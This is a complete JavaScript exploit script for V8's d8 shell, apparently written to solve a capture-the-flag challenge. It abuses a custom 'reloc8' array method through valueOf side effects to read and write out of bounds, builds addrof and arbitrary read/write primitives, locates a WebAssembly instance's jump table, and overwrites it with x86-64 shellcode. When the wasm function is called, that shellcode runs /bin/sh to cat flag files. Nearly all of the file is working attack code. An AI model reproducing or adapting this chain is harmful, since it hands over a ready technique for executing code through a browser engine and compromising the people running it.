// t5.js — full chain: arb R/W -> jump_table_start -> shellcode -> wf()
// local dev run: ./d8 --allow-natives-syntax t5.js   (no natives actually needed except debug)

// ===== pre-groom =====
const wbytes = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,
  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b
]);
const wmod  = new WebAssembly.Module(wbytes);
const winst = new WebAssembly.Instance(wmod);
const wf    = winst.exports.f;

const cvBuf   = new ArrayBuffer(8);
const cvF     = new Float64Array(cvBuf);
const cvU     = new Uint32Array(cvBuf);
const NSCAN   = 512;
const scanBuf = new ArrayBuffer(8 * NSCAN);
const scanF   = new Float64Array(scanBuf);
const dumpU   = new Uint32Array(64);

// shellcode: execve("/bin/sh", ["/bin/sh","-c","cat flag_*.txt"], NULL); fallback exit(0)
// 88 bytes (11 qwords), nops padded
const sc = [
  0xF3,0x0F,0x1E,0xFA,                                 // endbr64 (CET/IBT)
  0x31,0xD2,                                           // xor edx,edx
  0x48,0xB8,0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x00,   // movabs rax,"/bin/sh\0"
  0x50,                                                 // push rax
  0x49,0x89,0xE5,                                       // mov r13,rsp
  0x48,0xB8,0x2D,0x63,0x00,0x00,0x00,0x00,0x00,0x00,   // movabs rax,"-c\0..."
  0x50,                                                 // push rax
  0x49,0x89,0xE6,                                       // mov r14,rsp
  0x48,0xB8,0x5F,0x2A,0x2E,0x74,0x78,0x74,0x00,0x00,   // movabs rax,"_*.txt\0\0"
  0x50,                                                 // push rax
  0x48,0xB8,0x63,0x61,0x74,0x20,0x66,0x6C,0x61,0x67,   // movabs rax,"cat flag"
  0x50,                                                 // push rax
  0x49,0x89,0xE7,                                       // mov r15,rsp -> "cat flag_*.txt"
  0x52,                                                 // push rdx (NULL)
  0x41,0x57,                                            // push r15
  0x41,0x56,                                            // push r14
  0x41,0x55,                                            // push r13
  0x48,0x89,0xE6,                                       // mov rsi,rsp
  0x4C,0x89,0xEF,                                       // mov rdi,r13 (ModRM: reg=101->r13, rm=111->rdi)
  0xB8,0x3B,0x00,0x00,0x00,                             // mov eax,59
  0x0F,0x05,                                            // syscall
  0xB8,0x3C,0x00,0x00,0x00,                             // mov eax,60 (exit)
  0x31,0xFF,                                            // xor edi,edi
  0x0F,0x05                                             // syscall
];

const fromArg = { n: 0, v: 0,
  valueOf() { this.n++; if (this.n === 1) return 0; this.n = 0; return this.v; } };
const toArg   = { n: 0, v: 0,
  valueOf() { this.n++; if (this.n === 1) return 0; this.n = 0; return this.v; } };

// ===== groom =====
const arr   = new Array(100).fill(1.1);
const ta    = new Float64Array(0x1337);
const probe = new Uint8Array(16);
const oarr  = [{}];
const rw    = [1.1];

// ===== scan =====
for (let k = 0; k < NSCAN; k++) {
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = k; toArg.v = 0;
  arr.reloc8(fromArg, toArg);
  scanF[k] = arr[0];
}
function lo(k) { cvF[0] = scanF[k]; return cvU[0]; }
function hi(k) { cvF[0] = scanF[k]; return cvU[1]; }

let taLenIdx = -1;
for (let k = 4; k < NSCAN - 4; k++)
  if (lo(k) === 0x99b8 && hi(k) === 0 && lo(k-1) === 0 && hi(k-1) === 0 &&
      (lo(k+2) !== 0 || hi(k+2) !== 0)) { taLenIdx = k; break; }
const taExtIdx = taLenIdx + 2;

let cageWordIdx = -1;
for (let j = taLenIdx + 1; j < NSCAN - 1; j++)
  if (lo(j-1) === 0x11 && hi(j-1) === 7) { cageWordIdx = j; break; }
const cageHi = cageWordIdx >= 0 ? lo(cageWordIdx) : 0;

let oarrElemIdx = -1, oarrAligned = true;
for (let c = cageWordIdx; c < NSCAN - 2; c++) {
  if (lo(c) === 0x5dd && hi(c) === 2) { oarrElemIdx = c; oarrAligned = true; break; }
  if (hi(c) === 0x5dd && lo(c+1) === 2) { oarrElemIdx = c; oarrAligned = false; break; }
}
const oarrContentIdx = oarrElemIdx + 1;

let rwIdx = -1;
for (let m = oarrElemIdx; m < NSCAN; m++)
  if (lo(m) === 0x9999999a && hi(m) === 0x3ff19999 && hi(m-1) === 2) { rwIdx = m; break; }

// ===== primitives =====
function addrofComp(o) {
  oarr[0] = o;
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = oarrContentIdx; toArg.v = 0;
  arr.reloc8(fromArg, toArg);
  cvF[0] = arr[0];
  return oarrAligned ? cvU[0] : cvU[1];
}
function setExt(alo, ahi) {
  cvU[0] = alo; cvU[1] = ahi;
  rw[0] = cvF[0];
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = rwIdx; toArg.v = taExtIdx;
  arr.reloc8(fromArg, toArg);
}
// read 8 bytes at 4-aligned cage address -> dumpU[off], dumpU[off+1]
function arbReadStitch(alo, ahi, off) {
  const base = alo & 0xfffffff8;
  setExt(base, ahi);      cvF[0] = ta[0];
  const a0 = cvU[0], a1 = cvU[1];
  setExt(base + 8, ahi);  cvF[0] = ta[0];
  if (alo & 4) { dumpU[off] = a1; dumpU[off+1] = cvU[0]; }
  else         { dumpU[off] = a0; dumpU[off+1] = a1; }
}

// ===== walk: instance -> trusted_data -> jump_table_start (td+40) =====
const instComp = addrofComp(winst);
arbReadStitch(instComp - 1, cageHi, 0);      // word0: map|props
arbReadStitch(instComp + 7, cageHi, 2);      // word1 (elements|trusted_data) at inst+8
const tdUntagged = dumpU[3] - 1;
arbReadStitch(tdUntagged + 40, cageHi, 4);   // jump_table_start
const jtLo = dumpU[4], jtHi = dumpU[5];

function h8(x) { let s = (x >>> 0).toString(16); while (s.length < 8) s = "0" + s; return s; }
console.log("cage=0x" + cageHi.toString(16) + "00000000" +
            " inst=0x" + cageHi.toString(16) + h8(instComp - 1) +
            " td=0x" + cageHi.toString(16) + h8(tdUntagged) +
            " jump_table=0x" + h8(jtHi) + h8(jtLo));

// ===== write shellcode at jump table start =====
setExt(jtLo, jtHi);
for (let i = 0; i < 11; i++) {
  const o = i * 8;
  cvU[0] = (sc[o]   | (sc[o+1] << 8) | (sc[o+2] << 16) | (sc[o+3] << 24)) >>> 0;
  cvU[1] = (sc[o+4] | (sc[o+5] << 8) | (sc[o+6] << 16) | (sc[o+7] << 24)) >>> 0;
  ta[i] = cvF[0];
}
// verify readback
cvF[0] = ta[0];
console.log("sc[0] readback = 0x" + h8(cvU[1]) + h8(cvU[0]) + " (want 0xb848d231fa1e0ff3)");
cvF[0] = ta[10];
console.log("sc[10] readback = 0x" + h8(cvU[1]) + h8(cvU[0]) + " (want 0x050fff310000003c)");

console.log("calling wf()...");
const r = wf();
console.log("wf() returned " + r + " (jump table bypassed?)");
